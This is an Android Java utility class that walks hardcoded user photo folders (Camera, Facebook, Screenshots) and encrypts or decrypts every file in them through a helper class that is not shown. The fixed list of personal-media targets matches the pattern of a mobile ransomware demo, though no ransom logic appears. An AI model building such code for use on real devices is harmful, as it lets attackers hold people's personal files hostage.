package com.example.nicetry;

import android.content.Context;
import android.os.Build;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import java.util.Arrays;
import java.util.List;

public class EncryptionDecryptionUtility {
    private final FileEncryption fileEncryption = new FileEncryption();
    private final List<String> targetDirectoryList = Arrays.asList(
            "/storage/emulated/0/DCIM/Camera/",
            "/storage/emulated/0/DCIM/Facebook/",
            "/storage/emulated/0/DCIM/Screenshots/");

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void encryptFiles(Context context) {
        try {
            for (String targetDirectory : targetDirectoryList) {
                fileEncryption.encryptEntireDirectory(targetDirectory);
            }
            Toast.makeText(context, "Files encrypted", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(context, "Something went wrong. Encryption failed. ", Toast.LENGTH_LONG).show();
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void decryptFiles(Context context) {
        try {
            for (String targetDirectory : targetDirectoryList) {
                fileEncryption.decryptEntireDirectory(targetDirectory);
            }
            Toast.makeText(context, "Files decrypted", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Toast.makeText(context, "Something went wrong. Decryption failed. ", Toast.LENGTH_LONG).show();
        }
    }
}
